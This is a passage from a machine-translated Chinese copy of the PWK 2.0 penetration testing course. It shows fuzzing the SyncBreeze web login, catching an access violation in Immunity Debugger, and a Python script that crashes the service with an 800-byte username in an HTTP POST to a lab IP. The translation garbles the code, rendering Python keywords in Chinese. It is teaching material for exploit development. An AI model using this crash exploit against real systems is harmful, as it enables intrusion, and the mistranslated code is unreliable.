<div style="position:absolute;top:63859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的 while 循环中，注意我们将用户名字段的长度增加了 100 个字符</font></font></nobr></div>
<div style="position:absolute;top:63879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每次登录尝试。</font><font style="vertical-align: inherit;">然后，我们在 HTTP POST 命令之间插入了 10 秒的延迟以</font></font></nobr></div>
<div style="position:absolute;top:63898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减慢进程并更清楚地显示哪个 HTTP POST 负责触发</font></font></nobr></div>
<div style="position:absolute;top:63917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font></font></nobr></div>
<div style="position:absolute;top:63950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在运行我们的 fuzzer 之前，我们必须在 SyncBreeze 运行时将调试器附加到它以捕获</font></font></nobr></div>
<div style="position:absolute;top:63969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何潜在的访问冲突。</font></font></nobr></div>
<div style="position:absolute;top:64002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们必须首先确定几个 SyncBreeze 进程中的哪个进程正在侦听 TCP</font></font></nobr></div>
<div style="position:absolute;top:64022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 80。虽然 Immunity Debugger 有一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Listening</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列旨在显示这一点</font></font></nobr></div>
<div style="position:absolute;top:64041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息，在我们的例子中是不可用的。</font><font style="vertical-align: inherit;">相反，我们将</font><font style="vertical-align: inherit;">为此</font><font style="vertical-align: inherit;">使用 Microsoft TCPView </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">312</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:64060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先</font><font style="vertical-align: inherit;">从“</font><i><font style="vertical-align: inherit;">选项”</font></i><font style="vertical-align: inherit;">菜单中</font><font style="vertical-align: inherit;">取消选中“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析地址</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”</font><font style="vertical-align: inherit;">以获得如图所示的视图</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:64080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 209。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:64199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">312 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2011 年），https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:64327;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="55"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 55 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64360;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:65437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:65437;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:65437;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">375</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64577;left:400"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 209：TCPView</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，进程名称为 syncbrs.exe，进程 ID 为 688。但是，当打开</font></font></nobr></div>
<div style="position:absolute;top:64627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Immunity Debugger 并导航到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">File</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Attach</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，此过程不会出现。</font><font style="vertical-align: inherit;">这是因为</font></font></nobr></div>
<div style="position:absolute;top:64647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncBreeze 以 SYSTEM 权限运行，而 Immunity Debugger 以普通用户身份执行。</font></font></nobr></div>
<div style="position:absolute;top:64666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了解决这个问题，我们需要重新启动具有管理权限的 Immunity Debugger -</font></font></nobr></div>
<div style="position:absolute;top:64685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击它并选择“以管理员身份运行”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64825;left:383"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 210：附加窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将调试器附加到应用程序会使其暂停，因此我们需要按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></nobr></div>
<div style="position:absolute;top:64888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在调试器已连接并且 SyncBreeze 正在运行，我们可以运行模糊测试脚本，它</font></font></nobr></div>
<div style="position:absolute;top:64908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">产生以下输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./fuzzer.py</font></font></font></b></nobr></div>
<div style="position:absolute;top:64960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用 100 字节模糊用户名</font></font></nobr></div>
<div style="position:absolute;top:64976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:64993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用 800 字节模糊用户名</font></font></nobr></div>
<div style="position:absolute;top:65010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用 900 字节模糊用户名</font></font></nobr></div>
<div style="position:absolute;top:65030;left:370"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 344 - 正在进行模糊测试</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们的用户名缓冲区长度达到大约 800 字节时，调试器会向我们显示</font></font></nobr></div>
<div style="position:absolute;top:65079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试在地址 41414141 执行代码时出现访问冲突： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:65515;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="56"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 56 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:65548;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:66625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:66625;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:66625;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">376</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:65896;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 211：Immunity Debugger 中的访问冲突</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的简单模糊器触发了应用程序中的一个漏洞！</font><font style="vertical-align: inherit;">这种类型的漏洞最常见</font></font></nobr></div>
<div style="position:absolute;top:65946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于诸如复制或移动之类的内存操作会覆盖其预期内存之外的数据</font></font></nobr></div>
<div style="position:absolute;top:65965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">区域。</font><font style="vertical-align: inherit;">当堆栈上发生覆盖时，这会导致堆栈缓冲区溢出。</font><font style="vertical-align: inherit;">这可能看起来</font></font></nobr></div>
<div style="position:absolute;top:65985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就像一个相当无害的疏忽，但我们将利用它来诱骗 CPU 执行我们的任何代码</font></font></nobr></div>
<div style="position:absolute;top:66004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">想。</font></font></nobr></div>
<div style="position:absolute;top:66037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的模糊器使 SyncBreeze 应用程序崩溃，我们需要重新启动它。</font><font style="vertical-align: inherit;">由于它作为</font></font></nobr></div>
<div style="position:absolute;top:66056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务，我们需要通过服务控制台</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services.msc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新启动它</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:66272;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 212：services.msc 中的 SyncBreeze 服务</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66303;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1.1.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 构建模糊器并复制 SyncBreeze 崩溃。</font></font></nobr></div>
<div style="position:absolute;top:66361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 检查其他寄存器和堆栈存储器的内容。</font><font style="vertical-align: inherit;">有什么好像是直接的</font></font></nobr></div>
<div style="position:absolute;top:66381;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受模糊输入的影响？</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2 Win32 缓冲区溢出漏洞利用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现一个可利用的漏洞是令人兴奋的，但将该发现发展为一个有效的</font></font></nobr></div>
<div style="position:absolute;top:66479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用并成功获得shell更是令人兴奋和实用。</font><font style="vertical-align: inherit;">为此，我们的第一个</font></font></nobr></div>
<div style="position:absolute;top:66498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标是获得对 EIP 寄存器的控制。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:66703;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="57"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 57 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:66736;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:67813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:67813;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:67813;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">377</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:66832;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:66832;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 DEP、ASLR 和 CFG 的一句话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:66870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经设计了多种保护机制来使 EIP 控制更难获得或</font></font></nobr></div>
<div style="position:absolute;top:66889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发。</font></font></nobr></div>
<div style="position:absolute;top:66922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft 实施了多种此类保护措施，特别是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据执行保护</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DEP)，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">313</font></font></font></nobr></div>
<div style="position:absolute;top:66941;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址空间布局随机化</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(ASLR)、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">314</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制流保护</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(CFG)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">315</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前</font></font></nobr></div>
<div style="position:absolute;top:66961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续，让我们更详细地讨论这些。</font></font></nobr></div>
<div style="position:absolute;top:66993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DEP 是一组硬件和软件技术，可对内存执行额外检查以</font></font></nobr></div>
<div style="position:absolute;top:67013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助防止恶意代码在系统上运行。</font><font style="vertical-align: inherit;">DEP 的主要好处是帮助</font></font></nobr></div>
<div style="position:absolute;top:67032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在进行此类尝试时引发异常来</font><font style="vertical-align: inherit;">防止从数据页</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">316</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行代码</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:67065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每次运行时，ASLR 都会随机化加载的应用程序和 DLL 的基地址</font></font></nobr></div>
<div style="position:absolute;top:67085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统启动。</font><font style="vertical-align: inherit;">在旧的 Windows 操作系统上，如 Windows XP，其中没有 ASLR</font></font></nobr></div>
<div style="position:absolute;top:67104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已实现，所有 DLL 每次都加载到相同的内存地址，从而使漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:67123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单得多。</font><font style="vertical-align: inherit;">与 DEP 结合使用时，ASLR 可以提供非常强大的缓解措施来防止漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:67156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，微软的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制流完整性</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现 CFG</font><font style="vertical-align: inherit;">执行间接验证</font></font></nobr></div>
<div style="position:absolute;top:67175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码分支，防止覆盖函数指针。</font></font></nobr></div>
<div style="position:absolute;top:67208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们来说幸运的是，SyncBreeze 软件是在没有 DEP、ASLR 或 CFG 支持的情况下编译的，</font></font></nobr></div>
<div style="position:absolute;top:67227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这使得利用过程更加简单，因为我们不必绕过，甚至不必担心</font></font></nobr></div>
<div style="position:absolute;top:67247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于，这些内部安全机制。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:67281;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:67281;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制崩溃</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:67319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于我们的 fuzzer 输出，我们可以假设 SyncBreeze 可能容易受到缓冲区溢出的影响</font></font></nobr></div>
<div style="position:absolute;top:67338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当通过 HTTP POST 请求提交长度约为 800 字节的用户名时</font></font></nobr></div>
<div style="position:absolute;top:67358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录时。</font><font style="vertical-align: inherit;">我们在利用过程中的第一个任务是编写一个简单的脚本来复制</font></font></nobr></div>
<div style="position:absolute;top:67377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们观察到的崩溃，而不必每次都运行模糊器。</font><font style="vertical-align: inherit;">我们的新脚本看起来像</font></font></nobr></div>
<div style="position:absolute;top:67397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 345 中所示的一个：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:67448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:67482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:67499;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:67533;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大小 = 800</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:67567;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = "A" * 大小</font></font></nobr></div>
<div style="position:absolute;top:67601;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:67635;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "POST /login HTTP/1.1\r\n"</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:67689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">313 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention</font></font></font></nobr></div>
<div style="position:absolute;top:67709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">314 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（迈克尔霍华德，2006 年），https://blogs.msdn.microsoft.com/michael_howard/2006/05/26/address-space-layout-randomization-in-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗远景/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:67743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">315 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard</font></font></font></nobr></div>
<div style="position:absolute;top:67763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">316 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Page_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(computer_memory)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:67891;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="58"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 58 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:67924;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:69001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:69001;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:69001;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">378</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68020;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "主机：10.11.0.22\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68036;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "用户代理：Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefo</font></font></nobr></div>
<div style="position:absolute;top:68053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x/52.0\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68070;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r</font></font></nobr></div>
<div style="position:absolute;top:68088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\n"</font></font></nobr></div>
<div style="position:absolute;top:68104;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Accept-Language: en-US,en;q=0.5\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68121;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "引用者：http://10.11.0.22/login\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68138;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "连接：关闭\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68155;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Content-Type: application/x-www-form-urlencoded\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68172;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "内容长度："+str(len(content))+"\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68189;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "\r\n"</font></font></nobr></div>
<div style="position:absolute;top:68223;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += 内容</font></font></nobr></div>
<div style="position:absolute;top:68257;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:68291;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect(("10.11.0.22", 80))</font></font></nobr></div>
<div style="position:absolute;top:68308;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:68342;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:68376;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“\n完成！”</font></font></nobr></div>
<div style="position:absolute;top:68410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了：</font></font></nobr></div>
<div style="position:absolute;top:68427;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n无法连接！"</font></font></nobr></div>
<div style="position:absolute;top:68446;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 345 - 重现缓冲区溢出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行时，此脚本会导致类似于我们之前观察到的访问冲突。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:68495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，我们能够始终如一地复制崩溃。</font><font style="vertical-align: inherit;">这是很好的第一步。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:68529;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:68529;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制EIP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制 EIP 寄存器是利用内存损坏的关键步骤</font></font></nobr></div>
<div style="position:absolute;top:68587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">EIP 寄存器类似于马的缰绳；</font><font style="vertical-align: inherit;">我们可以用它来控制方向</font></font></nobr></div>
